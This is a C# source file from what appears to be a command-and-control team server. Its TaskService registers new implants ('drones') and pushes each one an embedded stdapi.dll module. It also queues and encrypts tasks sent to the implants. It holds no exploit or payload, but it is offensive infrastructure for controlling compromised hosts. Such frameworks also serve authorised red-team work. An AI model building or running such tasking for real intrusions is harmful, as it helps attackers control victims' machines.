using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

using TeamServer.Interfaces;
using TeamServer.Models;

namespace TeamServer.Services
{
    public class TaskService : ITaskService
    {
        private readonly IServerService _server;
        private readonly IDroneService _drones;
        private readonly ICryptoService _crypto;

        public TaskService(IServerService server, IDroneService drones, ICryptoService crypto)
        {
            _server = server;
            _drones = drones;
            _crypto = crypto;
        }

        public async Task RecvC2Data(IEnumerable<MessageEnvelope> messages)
        {
            foreach (var message in messages)
                await _server.HandleC2Message(message);
        }

        public async Task<MessageEnvelope> GetDroneTasks(DroneMetadata metadata)
        {
            var drone = _drones.GetDrone(metadata.Guid);

            if (drone is null)
            {
                drone = new Drone(metadata);
                
                // may need to resend this
                drone.TaskDrone(new DroneTask("core", "load-module")
                {
                    Artefact = await Utilities.GetEmbeddedResource("stdapi.dll")
                });
                
                _drones.AddDrone(drone);
            }
                
            drone.CheckIn();

            var tasks = drone.GetPendingTasks().ToArray();
            if (!tasks.Any()) return null;

            var message = new C2Message(C2Message.MessageDirection.Downstream, C2Message.MessageType.DroneTask)
            {
                Data = tasks.Serialize(),
                Metadata = new DroneMetadata { Guid = metadata.Guid }
            };

            var envelope = _crypto.EncryptMessage(message);
            envelope.Drone = metadata.Guid;

            return envelope;
        }
    }
}